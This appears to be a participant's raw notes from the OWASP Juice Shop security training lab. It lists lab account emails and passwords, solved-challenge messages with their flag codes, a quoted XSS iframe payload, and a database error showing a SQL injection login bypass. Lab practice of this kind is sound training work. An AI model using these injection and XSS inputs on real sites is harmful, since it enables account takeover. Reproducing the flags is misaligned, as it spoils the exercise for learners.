143.110.250.149

AbuseIPDB, and Cisco Talos Intelligence


admin@juice-sh.op		admin123
bender@juice-sh.op
jim@juice-sh.op			james
mc.safesearch@juice-sh.op	Mr. N00dles
This thang would look phat on Bobby's jacked fur coat!

uvogin@juice-sh.op
K33p5 y0ur ju1cy 5plu773r 70 y0ur53lf!

bjoern@owasp.org

uvogin@juice-sh.op
y0ur f1r3wall needs m0r3 musc13

morty@juice-sh.op

You successfully solved a challenge: Login Admin (Log in with the administrator's user account.)X
32a5e0f21372bcc1000a6088b93b458e41f0e02a 
---
 You successfully solved a challenge: Login Bender (Log in with Bender's user account.)X
fb364762a3c102b2db932069c0e6b78e738d4066 
---
You successfully solved a challenge: Error Handling (Provoke an error that is neither very gracefully nor consistently handled.)
169940f83378cc420ae4fdeb9c1f73631a2baee6
---
 You successfully solved a challenge: Score Board (Find the carefully hidden 'Score Board' page.)X
7efd3174f9dd5baa03a7882027f2824d2f72d86e 
---
 You successfully solved a challenge: Password Strength (Log in with the administrator's user credentials without previously changing them or applying SQL Injection.)X
c2110d06dc6f81c67cd8099ff0ba601241f1ac0e 
---
 You successfully solved a challenge: Reset Jim's Password (Reset Jim's password via the Forgot Password mechanism with the original answer to his security question.)X
094fbc9b48e525150ba97d05b942bbf114987257 
---
 You successfully solved a challenge: Confidential Document (Access a confidential document.)X
edf9281222395a1c5fee9b89e32175f1ccf50c5b 
---
 You successfully solved a challenge: Login MC SafeSearch (Log in with MC SafeSearch's original user credentials without applying SQL Injection or any other bypass.)X
66bdcffad9e698fd534003fbb3cc7e2b7b55d7f0 
---
 You successfully solved a challenge: Forgotten Developer Backup (Access a developer's forgotten backup file.)X
bfc1e6b4a16579e85e06fee4c36ff8c02fb13795

You successfully solved a challenge: Easter Egg (Find the hidden easter egg.)X
96f9b8e453620be1ec15e9f7c811883989b154b0

You successfully solved a challenge: Misplaced Signature File (Access a misplaced SIEM signature file.)X
b3c2de7020aee45b78bb11274596c405844415ac

You successfully solved a challenge: Forgotten Sales Backup (Access a salesman's forgotten backup file.)X
260c0b102f5dc542362dd9274644d775d10f5c05 

You successfully solved a challenge: Nested Easter Egg (Apply some advanced cryptanalysis to find the real easter egg.)X
71284403053be488edb9850d233cbf752c0da8fb 

/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg

You successfully solved a challenge: Admin Section (Access the administration section of the store.)X
946a799363226a24822008503f5d1324536629a0 

You successfully solved a challenge: View Basket (View another user's shopping basket.)X
41b997a36cc33fbe4f0ba018474e19ae5ce52121 

You successfully solved a challenge: Five-Star Feedback (Get rid of all 5-star customer feedback.)X
50c97bcce0b895e446d61c83a21df371ac2266ef 

You successfully solved a challenge: DOM XSS (Perform a DOM XSS attack with <iframe src="javascript:alert(`xss`)">.)X
9aaf4bbea5c30d00a1f5bbcfce4db6d4b0efe0bf 

You successfully solved a challenge: HTTP-Header XSS (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> through an HTTP header. (This challenge is potentially harmful on Docker!))X
149aa8ce13d7a4a8a931472308e269c94dc5f156 

admin@juice-sh.op
jim@juice-sh.op
bender@juice-sh.op
bjoern.kimminich@gmail.com
ciso@juice-sh.op
support@juice-sh.op
morty@juice-sh.op
mc.safesearch@juice-sh.op
J12934@juice-sh.op
wurstbrot@juice-sh.op
amy@juice-sh.op
bjoern@juice-sh.op
bjoern@owasp.org
accountant@juice-sh.op
uvogin@juice-sh.op
demo



 "error": {
    "message": "SQLITE_ERROR: near \"d41d8cd98f00b204e9800998ecf8427e\": syntax error",
    "stack": "SequelizeDatabaseError: SQLITE_ERROR: near \"d41d8cd98f00b204e9800998ecf8427e\": syntax error\n    at Query.formatError (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:422:16)\n    at Query._handleQueryResponse (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:73:18)\n    at afterExecute (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:250:31)\n    at replacement (/juice-shop/node_modules/sqlite3/lib/trace.js:19:31)\n    at Statement.errBack (/juice-shop/node_modules/sqlite3/lib/sqlite3.js:14:21)",
    "name": "SequelizeDatabaseError",
    "parent": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Users WHERE email = '' or 1=1- -' AND password = 'd41d8cd98f00b204e9800998ecf8427e' AND deletedAt IS NULL"
    },
    "original": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Users WHERE email = '' or 1=1- -' AND password = 'd41d8cd98f00b204e9800998ecf8427e' AND deletedAt IS NULL"
    },
    "sql": "SELECT * FROM Users WHERE email = '' or 1=1- -' AND password = 'd41d8cd98f00b204e9800998ecf8427e' AND deletedAt IS NULL"